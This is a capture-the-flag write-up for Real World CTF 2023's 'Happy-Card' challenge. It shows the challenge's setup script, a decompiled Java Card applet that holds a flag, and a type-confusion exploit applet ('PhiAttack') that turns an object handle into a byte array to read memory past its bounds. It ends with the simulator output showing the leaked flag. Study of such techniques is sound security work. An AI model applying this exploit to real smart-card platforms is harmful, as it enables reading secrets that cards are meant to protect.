# Real World CTF 2023: Happy-Card Writeup

> 原文: https://www.ctfiot.com/90444.html
> ID: 90444


```
creating: attachments/
 inflating: attachments/Dockerfile
 creating: attachments/files/
 inflating: attachments/files/entrypoint.sh
 inflating: attachments/files/hello.cap
 inflating: attachments/files/java_card_simulator-3_1_0-u5-win-bin-do-b_70-09_mar_2021.msi
 inflating: attachments/files/java_card_tools-win-bin-b_17-06_jul_2021.zip
 inflating: attachments/start.sh
[...]

verifycap() {
	java -Djc.home="$JC_HOME_TOOLS" -classpath "$TOOLS_CP" com.sun.javacard.offcardverifier.Verifier -nobanner $@
}

scriptgen() {
	java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.scriptgen.Main -nobanner $@
}

script=/tmp/script

verifycap -outfile /tmp/hello.cap.digest /files/hello.cap # 3
scriptgen -hashfile /tmp/hello.cap.digest -o /tmp/hello.cap.script /files/hello.cap # 3
cat << EOF > $script
powerup;
output off; # 1
0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F; # 2
EOF
FLAG=`echo -n "$FLAG"|perl -lne 'print map {"0x".(unpack "H*",$_)." "} split //, $_;'`
cat /tmp/hello.cap.script >> $script # 3
cat << EOF >> $script
0x80 0xB8 0x00 0x00 0x08 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xAA 0x00 0x7F;
0x00 0xA4 0x04 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xAA 0x7F; # 4
0x88 0x88 0x00 0x00 0x30 $FLAG 0x7f; # 5
0x00 0xA4 0x04 0x00 0x09 0xA0 0x00 0x00 0x00 0x62 0x03 0x01 0x08 0x01 0x7F; # 6
EOF

TMPDIR=/jctmp
mkdir $TMPDIR
cd /upload
for capfile in *.cap; do # 7
 [ -f "$capfile" ] || continue
	verifycap -outfile "$TMPDIR/$capfile.digest" /upload/*.exp "$capfile" || { echo "verify failed"; exit; }
	scriptgen -hashfile "$TMPDIR/$capfile.digest" -o "$TMPDIR/$capfile.script" "$capfile" || { echo "scriptgen failed"; exit; }
	cat "$TMPDIR/$capfile.script" >> /tmp/script
done
echo "All verification finished"

cat << EOF >> $script
0x80 0xB8 0x00 0x00 0x08 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF 0x00 0x7F; # 8
0x00 0xA4 0x04 0x00 0x06 0xAA 0xBB 0xCC 0xDD 0xEE 0xFF 0x7F; # 9
output on; # 10
0x88 0x66 0x00 0x00 0x00 0x7f; # 11
EOF

wine 'C:\Program Files\Oracle\Java Card Development Kit Simulator 3.1.0\bin\cref_t1.exe' -nobanner -nomeminfo &
sleep 5
java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.apdutool.Main -nobanner -noatr $script
// Decompiled with: CFR 0.152
// Class Version: 7
package com.rw.hello;

import javacard.framework.APDU;
import javacard.framework.Applet;
import javacard.framework.ISOException;
import javacard.framework.JCSystem;
import javacard.framework.Util;

public class safe
extends Applet {
 private byte[] secret = new byte[48];
 private boolean isInit = false;

 public static void install(byte[] bArray, short bOffset, byte bLength) {
 new safe();
 }

 protected safe() {
 this.register();
 }

 public void process(APDU apdu) {
 byte[] buffer = apdu.getBuffer();
 if (buffer[0] == 0 && buffer[1] == -92) {
 return;
 }
 if (buffer[0] == -120 && buffer[1] == -120) {
 if (buffer[4] != 48) {
 ISOException.throwIt((short)26368);
 }
 if (this.isInit) {
 ISOException.throwIt((short)27014);
 }
 JCSystem.beginTransaction();
 Util.arrayCopy(buffer, (short)5, this.secret, (short)0, (short)48);
 this.isInit = true;
 JCSystem.commitTransaction();
 return;
 }
 if (buffer[0] == -120 && buffer[1] == 102) {
 if (buffer[4] != 48) {
 ISOException.throwIt((short)26368);
 }
 if (!this.isInit) {
 ISOException.throwIt((short)27014);
 }
 JCSystem.beginTransaction();
 Util.arrayCopy(buffer, (short)5, this.secret, (short)0, (short)48);
 JCSystem.commitTransaction();
 return;
 }
 }
}
struct Array { // header length: 8 byte
 u16 objectTag = 0x8000; // this object represents a byte array
 u8 securityContext = 0x22;
 u16 arrayType = 0x0; // this is a byte array?
 u8 arrayMagic = 0x1C; // this is an array
 u16 length = 0x30;
 // end of header, followed by data
 u8 data[length];
};
struct ObjectHeader { // length: 6 byte
 u16 objectTag;
 u8 securityContext;
 u16 classDef;
 u8 package;
};
struct ExploitApplet {
 ObjectHeader header;
 u16 dontKnow;
 u16 meMySelfAndI = 0xda; // Object ref
 u16 test = 0xdb; // byte[] ref
 u16 longarr = 0xda; // byte[] ref
 u16 tag = 0x1234; // short
 u16 tag2 = 0x5678; // short
};
public byte[] fromShort(short input) {
 return null; // this is fine!
}
public byte[] fromShort(byte[] input) {
 return this; // this is fine!
}
// Perform the PhiAttack
PhiProxy proxyInstance = new PhiProxy();
Phi phiInstance = proxyInstance;

// Type confusion: Convert our object to its short handle
short meMySelfAndIHandle = phiInstance.toShort(meMySelfAndI);

// Convert the handle back, but this time to a byte array
// and not the Object it actually represents
longarr = phiInstance.fromShort(meMySelfAndIHandle);

// read from the array, leaking the flag
byte[] buffer = apdu.getBuffer();
Util.arrayCopyNonAtomic(
 longarr,
 // read start index. Skip far enough ahead to reach the flag
 (short) 0x2b5,
 buffer,
 (short) 0,
 // bytes to read. Read enough. 0x85 seems to be max buffer length
 (short) 0x85
);
apdu.setOutgoingAndSend((short) 0, (short) 0x85);
[ INFO: ] Verification completed with 0 warnings and 0 errors.
All verification finished
Mask has now been initialized for use
OUTPUT OFF;
OUTPUT ON;
CLA: 88, INS: 66, P1: 00, P2: 00, Lc: 00, Le: 85, 30, 72, 77, 63, 74, 66, 7b, 48, 34, 70, 70, 79, 43, 61, 33, 64, 37, 30, 36, 32, 32, 39, 39, 31, 62, 39, 37, 32, 33, 38, 39, 61, 31, 66, 30, 35, 37, 35, 65, 64, 37, 64, 32, 30, 34, 38, 38, 66, 7d, 80, 68, 01, 01, 80, 73, 01, 01, 00, 80, 00, 00, ff, 00, 01, 03, 00, 00, 86, d1, 86, d2, 86, d3, 80, 00, 00, 00, 00, 1c, 00, 06, aa, bb, cc, dd, ee, 10, 20, 00, 00, 00, 11, 05, 00, c6, 20, 00, 11, 00, 00, 1d, 00, 94, 00, c3, 01, 00, 80, 00, 10, 00, 00, 1c, 00, 04, 73, 61, 66, 65, 80, 00, 10, 00, 00, 1c, 00, 0c, 63, 6f, 6d, 2e, 72, 77, SW1: 90, SW2: 00
C-JCRE was powered down.
bye%
0rwctf{H4ppyCa3d70622991b972389a1f0575ed7d20488f}.h...s......ÿ......Ñ.Ò.Ó........ª»ÌÝî. ......Æ ........Ã..........safe........com.rw
```
